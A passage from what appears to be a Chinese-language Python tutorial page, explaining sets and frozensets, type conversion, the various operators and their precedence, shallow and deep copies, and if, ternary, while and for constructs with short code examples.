# 删除指定元素
c.remove(6)
print(len(c)) # 输出2

# 判断是否包含指定字符串
print("孙悟空" in c) # 输出True

c.add("猪八戒")
print(c)

# 使用set()函数(构造器)来创建set集合
books = set()
books.add("疯狂PHP讲义")
books.add("疯狂Java讲义")
print(books)

# issubset()方法判断是否为子集合
print("books集合是否为c的子集合？", books.issubset(c)) # 输出False
# issubset()方法与<=运算符效果相同
print("books集合是否为c的子集合？", (books <= c))      # 输出False

# issuperset()方法判断是否为父集合
print("c集合是否完全包含books集合？", c.issuperset(books)) # 输出False
# issuperset()方法与>=运算符效果相同
print("c集合是否完全包含books集合？", (c >= books)) # 输出False

# 用c集合减去books集合里的元素,不改变c集合本身
result1 = c - books
print(result1)
# difference()方法也是对集合做减法,与用-执行运算的效果完全一样
result2 = c.difference(books)
print(result2)
# 用c集合减去books集合里的元素,改变c集合本身
c.difference_update(books)
print("c集合的元素:" , c)

# 删除c集合里的所有元素
c.clear()
print("c集合的元素:" , c)

# 直接创建包含元素的集合
d = {"疯狂Java讲义", '疯狂Python讲义', '疯狂Kotlin讲义'}
print("d集合的元素:" , d)

# 计算两个集合的交集,不改变d集合本身
inter1 = d & books
print(inter1)
# intersection()方法也是获取两个集合的交集,与用&执行运算的效果完全一样
inter2 = d.intersection(books)
print(inter2)
# 计算两个集合的交集,改变d集合本身
d.intersection_update(books)
print("d集合的元素:" , d)

# 将range对象包装成set集合
e = set(range(5))
f = set(range(3, 7))
print(e)
print(f)

# 对两个集合执行异或运算
xor = e ^ f
print('e和f执行xor的结果:', xor)
# 计算两个集合的并集,不改变e集合本身
un = e.union(f)
print('e和f执行并集的结果:', un)
# 计算两个集合的并集,改变e集合本身
e.update(f)
print('e集合的元素:', e)

</textarea>

<h4>frozenset集合(set集合的不可变版本)</h4><pre>
frozenset是set的不可变版本,因此set集合中所有能改变集合本身的方法(如add、remove、discard、xxx_update等)frozenset都不支持;set集合中不改变集合本身的方法fronzenset都支持

print([e for e in dir(frozenset) if not e.startswith('_')])
['copy', 'difference', 'intersection', 'isdisjoint', 'issubset', 'issuperset', 'symmetric_difference', 'union']

frozenset的作用主要有两点:
1、当集合元素不需要改变时,使用frozenset代替set更安全。
2、当某些API需要不可变对象时必须用frozenset代替set,比如dict的key必须是不可变对象,因此只能用frozenset;再比如set本身的集合元素必须是不可变的,因此set不能包含set,set只能包含frozenset

</pre><textarea>
s = set()
# 使用frozenset()函数创建frozenset不可变集合
frozen_s = frozenset('Kotlin')
print(type(frozen_s), frozen_s)  # < class 'frozenset'> frozenset({'i', 'n', 'K', 'o', 'l', 't'})
# 为set集合添加frozenset
s.add(frozen_s)
print(s)           #  {frozenset({'t', 'o', 'i', 'K', 'l', 'n'})}
sub_s = {'Python'}
# 为set集合添加普通set集合,程序报错
s.add(sub_s)       # TypeError: unhashable type: 'set'

</textarea>
</div>

<div id="translate">
<h4>Python数据类型转换</h4><pre>
height = 70.0
print("您的身高"+height)  # TypeError: must be str, not float

有时需要对数据内置的类型进行转换,数据类型的转换只需要将数据类型作为函数名即可。
以下几个内置的函数可以执行数据类型之间的转换,这些函数返回一个新的对象,表示转换的值。

int(x [,base]): 将x转换为一个整数
float(x): 将x转换到一个浮点数
bool(x): 将x转换到一个布尔值
complex(real [,imag]): 创建一个复数
str(x): 将对象x转换为字符串
repr(x): 将对象x转换为表达式字符串
eval(str): 用来计算在字符串中的有效Python表达式,并返回一个对象
tuple(s): 将序列s转换为一个元组
list(s): 将序列s转换为一个列表
set(s): 转换为可变集合
dict(d): 创建一个字典,d必须是一个序列(key,value)元组。
frozenset(s): 转换为不可变集合
chr(x): 将一个整数转换为一个字符
unichr(x): 将一个整数转换为Unicode字符
ord(x): 将一个字符转换为它的整数值
hex(x): 将一个整数转换为一个十六进制字符串
oct(x): 将一个整数转换为一个八进制字符串

在使用类型转换函数时,提供给它的数据必须是有意义的,例如int()函数无法将一个非数字字符串转换成整数:
print(int("123"))    # 123
print(int("123个"))  # ValueError: invalid literal for int() with base 10: '123个'

【 help(int) 】
将一个指定进制的数字型字符串或者十进制数字转化为整形
int(x=0) -> integer
int(x, base=10) -> integer

参数
x:字符串或数字
base:正整型参数,默认十进制,用于指明x是一个几进制的数

>>>int()               # 不传入参数时,得到结果0
0
>>> int(3)
3
>>> int(3.6)
3
>>> int('12',16)        # 如果是带参数base的话,12要以字符串的形式进行输入,12为16进制
18
>>> int('0xa',16)
10
>>> int('10',8)
8

Convert a number or string to an integer, or return 0 if no arguments are given.  If x is a number, return x.__int__().  For floating point numbers, this truncates towards zero.

If x is not a number or if base is given, then x must be a string,
bytes, or bytearray instance representing an integer literal in the given base.  The literal can be preceded by '+' or '-' and be surrounded
by whitespace.  The base defaults to 10.  Valid bases are 0 and 2-36.
Base 0 means to interpret the basefromthe string as an integer literal.
>>> int('0b100', base=0)
4

【 进制转换 】
十进制转二进制bin(18)--> '0b10010',去掉0b就是10010,即为十进制18转二进制是10010
十进制转八进制oct(18) -->'0o22',去掉0o就是22,即为十进制18转八进制是22
十进制转十六进制hex(18) -->'0x12',去掉0x 就是12,即为十进制18转八进制是12

反过来的话:
二进制转十进制 int('0b10010',2) --> 18
八进制转十进制 int('022',8)--> 18
十六进制转十进制 int('0x12',16)--> 18


↓   2进制 8进制 10进制    16进制
2进制 -   bin(int(x, 8))  bin(int(x, 10)) bin(int(x, 16))
8进制 oct(int(x, 2))  -   oct(int(x, 10)) oct(int(x, 16))
10进制    int(x, 2)   int(x, 8)   -   int(x, 16)
16进制    hex(int(x, 2))  hex(int(x, 8))  hex(int(x, 10)) -

bin()、oct()、hex()的返回值均为字符串,且分别带有0b、0o、0x前缀。

</pre>
</div>

<div id="operator">
<h3>Python运算符</h3><pre>
Python语言支持以下类型的运算符:
算术运算符
比较(关系)运算符
赋值运算符
逻辑运算符
位运算符
成员运算符
身份运算符
运算符优先级

</pre><textarea>
import operator
action = {
    "+": operator.add,
    "-": operator.sub,
    "/": operator.truediv,
    "*": operator.mul,
    "**": pow
}
print(action['-'](50, 25)) # 25

</textarea><pre>
【 算术运算符 】
+ 加
两个对象相加, 此外+还可以作为字符串的连接运算符
print(10 + 20)  # 30
print('Hello, ' + 'Charlie')  # 拼接字符串

- 减
得到负数或是一个数减去另一个数,此外-还可以作为求负的运算符,但单目运算符+则不对操作数做任何改变
print(10 - 20)  # -10

x = -5.0
print(-x)  # 求负

* 乘
两个数相乘或是返回一个被重复若干次的字符串,此外＊还可以作为字符串的连接运算符,表示将N个字符串连接起来
print(10 * 20)  # 200
print('crazyit ' * 5) # crazyit crazyit crazyit crazyit crazyit

/ 除
x除以y,除不尽时会产生小数部分,不允许使用0作为除数,否则将会引发ZeroDivisionError错误
print(20 / 10)  # 2
print(1/2)      # 0.5
print(1.0/2)    # 0.5

% 取模
返回除法的余数,求余运算也需要进行除法运算,因此求余运算的第二个操作数不能是0
Python不要求求余运算符的两个操作数都是整数,Python的求余运算符完全支持对浮点数求余。求余运算的结果不一定总是整数,它是使用第一个操作数来除以第二个操作数,得到一个整除的结果后剩下的值就是余数

浮点数在Python中可能产生精度丢失的问题
print(5 % 3)        # 输出2
print(5.2 % 3.1)    # 输出2.1
print(-5.2 % -3.1)  # 输出-2.1
print(5.2 % -2.9)   # 输出-0.5999999999999996
print(5.2 % -1.5)   # 输出-0.7999999999999998
print(-5.2 % 1.5)   # 输出0.7999999999999998
print(5 % 0.0)      # 导致错误

** 幂、乘方运算符
返回x的y次幂
10**20为10的20次方 => 100000000000000000000
print('5 的 2 次方:', 5 ** 2)          # 25
print('4 的 3 次方:', 4 ** 3)          # 64

由于开方其实是乘方的逆运算,因此实际上使用"**"也可进行开方运算
print('4 的开平方:', 4 ** 0.5)         # 2.0
print('27 的开 3 次方:',27 **(1 / 3 )) # 3.0

// 取整除
整除,使用它除出来的结果只有整数部分,小数部分将会被舍弃,向下取整
print(9//2)     # 4
print(-9//2)    # -5
print(5.2//3.1) # 1.0

【 比较运算符、关系运算符 】
用于对常量、变量或表达式的结果进行大小、真假等比较,如果比较结果为真则返回True;反之则返回False

以下假设变量a为10,变量b为20:

==  等于 - 比较对象是否相等 (a == b)=>False
!=  不等于 - 比较两个对象是否不相等 (a != b)=>true
> 大于 - 返回x是否大于y (a > b)=>False。
< 小于 - 返回x是否小于y。所有比较运算符返回1表示真,返回0表示假。这分别与特殊的变量True和False等价。 (a < b) 返回 true。
>=  大于等于  - 返回x是否大于等于y。 (a >= b)=>False。
<=  小于等于 -  返回x是否小于等于y。 (a <= b)=>true。

a == b 为True,a is b 不一定为True
a is b 为True,则 a == b 一定为True
这是因为 == 只比较值,而is同时比较值和内存地址

>>> a = 'abc!'
>>> b = 'abc!'
>>> a == b  # True
>>> a is b  # False
>>> c = a
>>> a is c  # True
>>> a == c  # True

nan是例外,nan与任何数包括它自己比较结果都是False
>>> a = float('nan')
>>> b = a
>>> a is b  # True
>>> a == b  # False
>>> id(a) == id(b)  # True
>>> type(a) == type(b)  # True
>>> hash(a) == hash(b)  # True

</pre><pre>
【 身份运算符 】
身份运算符用于比较两个对象的存储单元,全局函数id()用于获取变量所引用的对象的内存地址,如果两个对象所在的内存地址相同则说明这两个对象其实是同一个对象

is判断两个标识符是不是引用自一个对象
判断两个变量所引用的对象是否相同,如果相同则返回 True
x is y, 类似id(x) == id(y), 如果引用的是同一个对象则返回True,否则返回False

is not判断两个标识符是不是引用自不同对象
判断两个变量所引用的对象是否不相同,如果不相同则返回 True
x is not y, 类似id(a) != id(b), 如果引用的不是同一个对象则返回结果True,否则返回False。

</pre><textarea>
a = 20
b = 20

print(id(a))  # 10969408
print(id(b))  # 10969408

if ( a is b ):
   print("1 - a 和 b 有相同的标识")
else:
   print("1 - a 和 b 没有相同的标识")

if ( a is not b ):
   print("2 - a 和 b 没有相同的标识")
else:
   print("2 - a 和 b 有相同的标识")

# 修改变量b的值
b = 30
print(id(b))   # 10969728
if ( a is b ):
   print("3 - a 和 b 有相同的标识")
else:
   print("3 - a 和 b 没有相同的标识")

if ( a is not b ):
   print("4 - a 和 b 没有相同的标识")
else:
   print("4 - a 和 b 有相同的标识")

# 1 - a 和 b 有相同的标识
# 2 - a 和 b 有相同的标识
# 3 - a 和 b 没有相同的标识
# 4 - a 和 b 没有相同的标识

</textarea>is与==区别:is用于判断两个变量引用对象是否为同一个(同一块内存空间), ==用于判断引用变量的值是否相等<textarea>
>>> a = [1,2,3]
>>> b = a
>>> print(b)
[1, 2, 3]
>>> b is a
True
>>> b == a
True
>>> b = a[:]
>>> print(b)
[1, 2, 3]
>>> b is a
False
>>> b == a
True

import time
# 获取当前时间
a = time.gmtime()
b =  time.gmtime()
print(a)      # time.struct_time(tm_year=2019, tm_mon=7, tm_mday=29, tm_hour=15, tm_min=58, tm_sec=59, tm_wday=0, tm_yday=210, tm_isdst=0)
print(b)      # time.struct_time(tm_year=2019, tm_mon=7, tm_mday=29, tm_hour=15, tm_min=58, tm_sec=59, tm_wday=0, tm_yday=210, tm_isdst=0)
print(a == b) # 代码运行速度很快,能保证是同一时间,a和b两个时间相等,输出True
print(a is b) # 每次调用 gmtime() 函数都返回不同的对象,a和b不是同一个对象,输出False

</textarea><pre>
【 赋值运算符 】
Python使用＝作为赋值运算符,常用于将表达式的值赋给另一个变量,也可使用赋值运算利将一个变量的值赋给另一个变量

=   简单的赋值运算符  c = a + b 将 a + b 的运算结果赋值为 c
+=  加法赋值运算符 c += a 等效于 c = c + a
-=  减法赋值运算符 c -= a 等效于 c = c - a
*=  乘法赋值运算符 c *= a 等效于 c = c * a
/=  除法赋值运算符 c /= a 等效于 c = c / a
%=  取模赋值运算符 c %= a 等效于 c = c % a
**= 幂赋值运算符  c **= a 等效于 c = c ** a
//= 取整除赋值运算符  c //= a 等效于 c = c // a
|=  按位或赋值 x = x | y
^=  按位与赋值 x = x ^ y
<<= 左移赋值 x = x << y,这里的y指的是左移的位数
>>= 右移赋值 x = x >> y,这里的y指的是右移的位数

a = 1 ; a += 1    # 第一种
a = 1; a = a + 1  # 第二种
+= 其背后使用的魔法方法是 __iadd__,如果没有实现这个方法则会退而求其次使用__add__
区别:用列表举例a += b,使用__add__的话就像是使用了a.extend(b),如果使用 __add__ 的话,则是 a = a+b,前者是直接在原列表上进行扩展,而后者是先从原列表中取出值,在一个新的列表中进行扩展,然后再将新的列表对象返回给变量,显然后者的消耗要大些,所以在能使用增量赋值的时候尽量使用它。

Python的赋值表达式是有值的,赋值表达式的值就是被赋的值,因此Python支持连续赋值
a = b = c = 20
c=20这个表达式的值就是20,故b也被赋值为20;依此类推,变量a也被赋值为20

变量的赋值操作：只是形成两个变量,实际还是指向同一个对象
浅拷贝：Python拷贝一般都是浅拷贝。拷贝时对象包含的子对象内容不拷贝,因此源对象和拷贝对象会引用同一个子对象。
深拷贝：使用copy模块的deepcopy函数,递归拷贝对象中包含的子对象,源对象和拷贝对象所有的子对象也不同。

</pre><textarea>
# 深拷贝和浅拷贝
import copy
class Person:
    def __init__(self,name,age):
        self.name=name
        self.age=age

class TellName:
    def tell(self):
        print("我是QA",self)

class ShowAge:
    def show(self):
        print("我的年龄是100",self)

t=TellName()
s=ShowAge()
p=Person(t,s)
p.name.tell()
n = p                  # 变量的赋值操作,在内存堆空间中并没有增加任何新的对象
print("p对象的内存地址是%s,子对象t的内存地址是%s,s的内存地址是%s;\nn对象的内存地址是%s,子对象t的内存地址是%s,s的内存地址是%s"%(tuple(map(lambda x:id(x),(p,p.name,p.age,n,n.name,n.age)))))
p2 = copy.copy(p)
print()
print("p对象的内存地址是%s,子对象t的内存地址是%s,s的内存地址是%s;\np2对象的内存地址是%s,子对象t的内存地址是%s,s的内存地址是%s"%(tuple(map(lambda x:id(x),(p,p.name,p.age,p2,p2.name,p2.age)))))
print()
p3 = copy.deepcopy(p)
print("p对象的内存地址是%s,子对象t的内存地址是%s,s的内存地址是%s;\np3对象的内存地址是%s,子对象t的内存地址是%s,s的内存地址是%s"%(tuple(map(lambda x:id(x),(p,p.name,p.age,p3,p3.name,p3.age)))))
'''
我是QA < hello.TellName object at 0x000001C4A3DAD608>
p对象的内存地址是1944074246280,子对象t的内存地址是1944074245640,s的内存地址是1944074246024;
n对象的内存地址是1944074246280,子对象t的内存地址是1944074245640,s的内存地址是1944074246024

p对象的内存地址是1944074246280,子对象t的内存地址是1944074245640,s的内存地址是1944074246024;
p2对象的内存地址是1944074246216,子对象t的内存地址是1944074245640,s的内存地址是1944074246024

p对象的内存地址是1944074246280,子对象t的内存地址是1944074245640,s的内存地址是1944074246024;
p3对象的内存地址是1944074338184,子对象t的内存地址是1944074248776,s的内存地址是1944074248840
'''

</textarea>变量赋值的几种形式,python的数值是不可变对象,无法在原处修改数据,所以不支持自增、自减<textarea>
(1).基本形式
x = "long"

(2).元组对应赋值
x, y = "long", "shuai"

(3).列表对应赋值
[x, y] = ["long", "shuai"]

# 列表元素也可以赋值给元组,或者元组赋值给列表,只要两边的序列元素个数能对应,无所谓左右两边的序列类型：
>>> (x,y) = (1,2)
>>> (x,y) = [1,2]
>>> [x,y] = (1,2)
>>> [x,y] = [1,2]
>>> (x,y) = 'ab'
>>> [x,y] = 'ab'

(4).序列赋值
在python中只要是序列都可以这样赋值
变量和序列中的元素必须一一对应。如果变量名与元素个数不同则会报错,除非只有一个变量名,这表示将整个序列赋值给这个变量。
如果想要将序列中的元素赋值给不等的变量,可以考虑先将序列进行切片
a, b, c, d = "long"
a, b, c, d = ("shell","perl","php","python")
a, b, c, d = ["shell","perl","php","python"]

>>> str='long'
>>> a, b, c = list(str[:2]) + [str[2:]]
>>> a,b,c  # ('l', 'o', 'ng')

(5).解包赋值
正好是让变量名少于元素个数的方式,这种赋值形式称为序列解包,多出来的元素会全部以列表的方式赋值给最后一个变量名
a, *b = 'long'
a, *b = ("shell","perl","php","python")
a, *b = ["shell","perl","php","python"]

(6).多目标赋值
python赋值时总是先计算=右边的结果,然后将结果按照赋值方式赋值给"="左边的变量。所以这里先将"long"赋值给变量b,再将b赋值给变量a
a = b = "long"              # 等价于b = "long"; a = b
因为总是先计算右边,所以交换变量非常的方便。
a, b = "a", "b"
a, b = b, a  # 交换
# 交换结果：
a == "b"
b == "a"

(7).二元赋值表达式
a += 3     # 等价于a = a + 3,在python中这种增强赋值的方式要比后者更高效率些

(8).嵌套赋值序列
((a, b), c) = ('lo','ng')
for (a, b, c) in [(1, 2, 3), (4, 5, 6)]:...
for ((a, b), c) in [((1, 2), 3), ((4, 5), 6)]:...
def f(((a, b), c)):...
f(((1, 2), 3))

</textarea><pre>
【 位运算符 】
位运算符通常在图形、图像处理和创建设备驱动等底层开发中使用。使用位运算符可以直接操作数值的原始bit位,尤其是在使用自定义的协议进行通信时,使用位运算符对原始数据进行编码和解码也非常有效
位运算符的操作对象是整数类型,它会把数字看做对应的二进制数来进行计算

</pre>下表中变量a为60,b为13,二进制格式如下<textarea>
a = 0011 1100
b = 0000 1101
-----------------
a&b = 0000 1100
a|b = 0011 1101
a^b = 0011 0001
~a  = 1100 0011

a = 60
b = 13
print(bin(60))   # 0b111100
print(bin(13))   # 0b1101
print(a&b)       # 12
print(a|b)       # 61
print(a^b)       # 49
print(~a)        # -61

</textarea><pre>
& 按位与运算符
参与运算的两个值,如果两个相应位都为1则该位的结果为1,否则为0
按位与运算的运算符是&,它有2个操作数,其运算法则是,按位将2个操作数对应的二进制数一一对应,只有对应数位都是1时此位对应的结果位才是1;反之就是0

| 按位或运算符
只要对应的二个二进位有一个为1时结果位就为1

^ 按位异或运算符
当两对应的二进位相异时结果为1

~ 按位取反运算符
对数据的每个二进制位取反,即把1变为0,把0变为1 。~x类似于-x-1

<< 左移动运算符
运算数的各二进位全部左移若干位,由 << 右边的数字指定了移动的位数,高位丢弃,低位补0
4 << 2表示数字4按位左移2位

>> 右移动运算符
把">>"左边的运算数的各二进位全部右移若干位,>> 右边的数字指定了移动的位数
4 >> 2表示数字4按位右移2位

【 逻辑运算符 】
Python语言支持逻辑运算符,逻辑运算符是对真和假两种布尔值进行运算,操作bool类型的变量、常量或表达式,逻辑运算的返回值也是bool类型值
对于组合逻辑来说,使用圆括号保证运算顺序非常重要,即使不是为了保证逻辑运算的顺序,且有括号和没括号的输出结果是一样的,建议使用圆括号来提高程序的可读性

and 逻辑与(简称"与"), a and b, 有2个操作数a和b,只有它们都是True时才返回True,否则返回False
or  逻辑或(简称"或"), a or b , 有2个操作数a和b,只有它们都是False时才返回False,否则返回True
not 逻辑非(简称"非"), not a  , 只需要1个操作数a,如果a的值为 True则返回 False;反之如果a的值为False则返回True

# 直接对False求非运算,将返回True
print(not False)
# 5>3返回True,20.0大于10,因此结果返回True
print(5 > 3 and 20.0 > 10)
# 4>=5返回False,"c">"a"返回True。求或后返回True
print(4 >= 5 or "c" > "a")

短路运算符
以下假设变量a为10, b为20:

and逻辑与
x and y
布尔"与" - 如果x为False,xandy 返回False,否则它返回y的计算值。 (a and b) 返回 20

or逻辑或
x or y
布尔"或" - 如果x是非 0,它返回x的值,否则它返回y的计算值。  (a or b) 返回 10

not逻辑非
not x
布尔"非" - 如果x为True则返回False 。如果x为False则返回True。  not(a and b) 返回 False

【 成员运算符 】
Python支持成员运算符,测试实例中包含了一系列的成员,包括字符串,列表或元组。

in  如果在指定的序列中找到值返回True,否则返回False
not in  如果在指定的序列中没有找到值返回True,否则返回False

</pre><textarea>
a = 10
b = 20
list = [1, 2, 3, 4, 5 ];

if ( a in list ):
   print("1 - 变量 a 在给定的列表中 list 中")
else:
   print("1 - 变量 a 不在给定的列表中 list 中")

if ( b not in list ):
   print("2 - 变量 b 不在给定的列表中 list 中")
else:
   print("2 - 变量 b 在给定的列表中 list 中")

# 修改变量 a 的值
a = 2
if ( a in list ):
   print("3 - 变量 a 在给定的列表中 list 中")
else:
   print("3 - 变量 a 不在给定的列表中 list 中")

</textarea><pre>
【 Python运算符优先级 】
Python中运算符的运算规则是,优先级高的运算符先执行,优先级低的运算符后执行,同一优先级的运算符按照从左到右的顺序进行。
Python语言中大部分运算符都是从左向右执行的,只有单目运算符如not逻辑非运算符、赋值运算符和三目运算符例外,它们是从右向左执行的

</pre>

<table>
<caption>运算符的优先级:从最高到最低</caption>
<tr><th>运算符说明</th><th>Python运算符</th><th>优先级</th></tr>
<tr><td>索引运算符</td><td>x[index] 或 x[index:index2[:index3]]</td><td>18、19</td></tr>
<tr><td>属性访问</td><td>x.attrbute</td><td>17</td></tr>
<tr><td>乘方</td><td>**</td><td>16</td></tr>
<tr><td>按位取反</td><td>~</td><td>15</td></tr>
<tr><td>符号运算符</td><td>+(正号)或 -(负号)</td><td>14</td></tr>
<tr><td>乘、除</td><td>*、/、//、%</td><td>13</td></tr>
<tr><td>加、减</td><td>+、-</td><td>12</td></tr>
<tr><td>位移</td><td>>>、<<</td><td>11</td></tr>
<tr><td>按位与</td><td>&</td><td>10</td></tr>
<tr><td>按位异或</td><td>^</td><td>9</td></tr>
<tr><td>按位或</td><td>|</td><td>8</td></tr>
<tr><td>比较运算符</td><td>==、!=、>、>=、<、<=</td><td>7</td></tr>
<tr><td>赋值运算符</td><td>= %= /= //= -= += *= **=</td><td></td></tr>
<tr><td>is运算符</td><td>is、is not</td><td>6</td></tr>
<tr><td>in运算符</td><td>in、not in</td><td>5</td></tr>
<tr><td>逻辑非</td><td>not</td><td>4</td></tr>
<tr><td>逻辑与</td><td>and</td><td>3</td></tr>
<tr><td>逻辑或</td><td>or</td><td>2</td></tr>
</table>

</div>

<div id="flow_control">
<h3>python流程控制语句</h3><pre>
【 多重赋值 】

</pre>编写斐波那契数列的初始子序列<textarea>
a, b = 0, 1
while a < 10:
    print(a, end = ",")
    a, b = b, a + b
print()

# 输出: 0,1,1,2,3,5,8

</textarea><pre>
第一行含有一个多重赋值: 变量a和b同时得到了新值0和1,最后一行又用了一次多重赋值,这体现出了右边的表达式在任何赋值发生之前就被求值了,右边的表达式是从左到右被求值的

赋值语句:
a, b = b, a + b
相当于:
t = (b, a + b)  # t是一个tuple
a = t[0]
b = t[1]

【 流程控制 】
程序在一般情况下是按顺序执行的,编程语言提供了各种控制结构,允许更复杂的执行路径

if条件
while循环
for循环
列表生成式

</pre>
</div>

<div id="if">
<h4>条件语句</h4><pre>
Python条件语句是通过一条或多条语句的执行结果(True或False)来决定执行的代码块
只要条件表达式是非零数值、非空字符串、非空list、非null等就判断为True,否则为False
表达式可以是任意类型,False、None、0、""、()、[]、{}等值作为bool表达式时会被解释器当作False处理

</pre>Python编程中if语句用于控制程序的执行,基本形式为:<textarea>
if 判断条件:
    执行语句……

if 判断条件:
    执行语句……
else:
    执行语句……

if 判断条件1:
    执行语句1……
elif 判断条件2:
    执行语句2……
elif 判断条件3:
    执行语句3……
else:
    执行语句4……

</textarea><textarea>
flag = False
name = 'luren'
if name == 'python':          # 判断变量是否为 python
    flag = True               # 条件成立时设置标志为真
    print('welcome boss')     # 并输出欢迎信息
else:
    print(name)               # 条件不成立时输出变量名称

</textarea><textarea>
birth = input('birth: ')
if birth < 2000:
    print('00前')
else:
    print('00后')

# 输入1982报错:TypeError: unorderable types: str() > int(),因为input()返回的数据类型是str,str不能直接和整数比较,必须先把str转换成整数,birth = int(birth)
# 输入abc报错:ValueError: invalid literal for int() with base 10: 'abc',int()函数发现一个字符串并不是合法的数字时就会报错,程序就退出

</textarea><textarea>
proof = int(input("输入驾驶员每 100ml 血液酒精的含量:"))
if proof < 20:
    print("驾驶员不构成酒驾")
else:
    if proof < 80:
        print("驾驶员已构成酒驾")
    else:
        print("驾驶员已构成醉驾")

</textarea>python并不支持switch语句,所以多个条件判断只能用elif来实现,如果判断需要多个条件需同时判断时可以使用or表示两个条件有一个成立时判断条件成功,使用and时表示只有两个条件同时成立的情况下判断条件才成功<textarea>
num = 9
if num >= 0 and num <= 10:    # 判断值是否在0~10之间
    print('hello')
# 输出结果: hello

num = 10
if num < 0 or num > 10:    # 判断值是否在小于0或大于10
    print('hello')
else:
    print('undefine')
# 输出结果: undefine

num = 8
# 判断值是否在0~5或者10~15之间
if (num >= 0 and num <= 5) or (num >= 10 and num <= 15):
    print('hello')
else:
    print('undefine')
# 输出结果: undefine

</textarea>简单的语句组: 可以在同一行的位置上使用if条件判断语句<textarea>
var = 100
if ( var  == 100 ) : print("变量var的值为100")
print("Good bye!")

</textarea>
</div>

<div id="sanyuan">
<h4>三元运算符</h4><pre>
三元运算符通常在Python里被称为条件表达式,这些表达式基于真(true)/假(false)的条件判断,在Python 2.4以上才有了三元操作
它允许用简单的一行快速判断,而不是使用复杂的多行if语句。 这在大多数时候非常有用,而且可以使代码简单可维护

伪代码:
#如果条件为真,返回真 否则返回假
True_statements if expression else False_statements

</pre><textarea>
a = 5
b = 3
st = "a大于b" if a > b else "a不大于b"
print(st)  # 输出"a大于b"

# 简写
print("a大于b") if a > b else print("a不大于b")  # 输出"a大于b"

</textarea><pre>
Python允许在三目运算符的True_statements或False_statements中放置多条语句,Python主要支持以下两种放置方式:
1、多条语句以英文逗号隔开:每条语句都会执行,程序返回多条语句的返回值组成的元组。
2、多条语句以英文分号隔开:每条语句都会执行,程序只返回第一条语句的返回值

</pre><textarea>
a = 5
b = 3

# 第一个返回值部分使用两条语句,逗号隔开
# True_statements为print("crazyit"),'a大于b',这两条语句都会执行,程序将会返回这两条语句的返回值组成的元组。由于print()函数没有返回值,相当于它的返回值是None
st = print("crazyit"), 'a大于b' if a > b else  "a不大于b"
print(st)

# 输出
crazyit
(None, 'a大于b')

# 第一个返回值部分使用两条语句,分号隔开
# True_statements包含两条语句,但程序只会返回第一条语句print("crazyit")的返回值,该语句同样返回None,因此相当于str的返回值为None
st = print("crazyit"); x = 20 if a > b else  "a不大于b"
print(st)
print(x)

# 输出
crazyit
None
20

</textarea>三目运算符支持嵌套,通过嵌套三目运算符,可以执行更复杂的判断<textarea>
c = 5
d = 5
print("c大于d") if c > d else (print("c小于d") if c < d else print("c等于d"))  # 输出c等于d

</textarea><pre>
另一个晦涩一点的用法比较少见,它使用了元组
之所以能正常工作,是因为在Python中,True等于1,而False等于0,这就相当于在元组中使用0和1来选取数据
没有被广泛使用,而且Python玩家一般不喜欢那样,因为没有Python味儿(Pythonic)。这样的用法很容易把真正的数据与True/False弄混

伪代码:
#(返回假,返回真)[真或假]
(if_test_is_false, if_test_is_true)[test]

</pre><textarea>
fat = True
fitness = ("skinny", "fat")[fat]
print("Ali is", fitness)  # 输出: Ali is fat

</textarea>
</div>

<div id="xunhuan">
<h4>循环语句</h4><pre>
Python提供了for循环和while循环,在Python中没有do..while循环
while循环: 在给定的判断条件为true时执行循环体,否则退出循环体。
for循环: 重复执行语句
嵌套循环: 可以在while循环体中嵌套for循环

循环控制语句
循环控制语句可以更改语句执行的顺序。Python支持以下循环控制语句:
break语句: 在语句块执行过程中终止循环,并且跳出整个循环
continue语句: 在语句块执行过程中终止当前循环,跳出该次循环,执行下一次循环。
return语句：跳出当前函数,返回调用函数处
pass语句: pass是空语句,是为了保持程序结构的完整性,pass不做任何事情,一般用做占位语句
死循环可以用Ctrl+C退出程序或强制结束Python进程

</pre><pre>
【 while循环 】
while 判断条件:
    执行语句……
执行语句可以是单个语句或语句块。判断条件可以是任何表达式,任何非零、或非空(null)的值均为true

</pre><textarea>
count = 0
while (count < 9):
   print('The count is:', count)
   count = count + 1

print("Good bye!")

</textarea><textarea>
i = 1
while i < 10:
    i += 1
    if i%2 > 0:     # 非双数时跳过输出
        continue
    print(i)        # 输出双数2、4、6、8、10

i = 1
while 1:            # 循环条件为1必定成立
    print(i)        # 输出1~10
    i += 1
    if i > 10:      # 当i大于10时跳出循环
        break

</textarea>如果条件判断语句永远为true,循环将会无限的执行下去,无限循环可以使用CTRL+C来中断循环<textarea>
var = 1
while var == 1 :  # 该条件永远为true,循环将无限执行下去
   num = input("Enter a number  :")
   print("You entered: ", num)

</textarea>while … else在循环条件为false时执行else语句块<textarea>
count = 0
while count < 5:
   print(count, " is  less than 5")
   count = count + 1
else:
   print(count, " is not less than 5")

</textarea>简单语句组: while循环体中只有一条语句时可以将该语句与while写在同一行中<pre>
flag = 1
while (flag): print('Given flag is really true!')
print("Good bye!")

</pre>使用while循环遍历列表和元组<textarea>
a_tuple = ('fkit', 'crazyit', 'Charli')
i = 0
# 只有i小于len(a_list)继续执行循环体
while i < len(a_tuple):
    print(a_tuple[i]) # 根据i来访问元组的元素
    i += 1

src_list = [12, 45, 34,13, 100, 24, 56, 74, 109]
a_list = [] # 定义保存整除3的元素
b_list = [] # 定义保存除以3余1的元素
c_list = [] # 定义保存除以3余2的元素
# 只要src_list还有元素,继续执行循环体
while len(src_list) > 0:
    # 弹出src_list最后一个元素
    ele = src_list.pop()
    # 如果ele % 2不等于0
    if ele % 3 == 0 :
        a_list.append(ele) # 添加元素
    elif ele % 3 == 1:
        b_list.append(ele) # 添加元素
    else:
        c_list.append(ele) # 添加元素
print("整除3:", a_list)
print("除以3余1:",b_list)
print("除以3余2:",c_list)

</textarea><pre>
【 for...in循环 】
依次把任何序列的项目如字符串、list、tuple、dict或集合中的每个元素遍历迭代出来,条目的迭代顺序与它们在序列中出现的顺序一致
for x in ...循环就是把任意序列的每个元素代入变量x,然后执行缩进块的语句

for i in iter(int, 1):pass # 死循环
iter()可将序列对象转化为一个迭代器,iter()函数的第二个用法iter(callable对象, sentinel)第一个对象会一直运行,直到它返回sentinel值才结束,int是一个内建方法,默认值0即int()==0,由于int()永远返回0,永远返回不了1,所以这个for循环会没有终点。一直运行下去

</pre><textarea>
# 输出Python的每个字母
for letter in 'Python':
   if letter == 'h':
      pass
      print('pass', end=',')
   print(letter, end=',')

print("done")  # P,y,t,pass,h,o,n,done

# for循环里同时引用了两个变量即多重赋值
for x, y in [(1, 1), (2, 4), (3, 9)]:
    print(x, y)

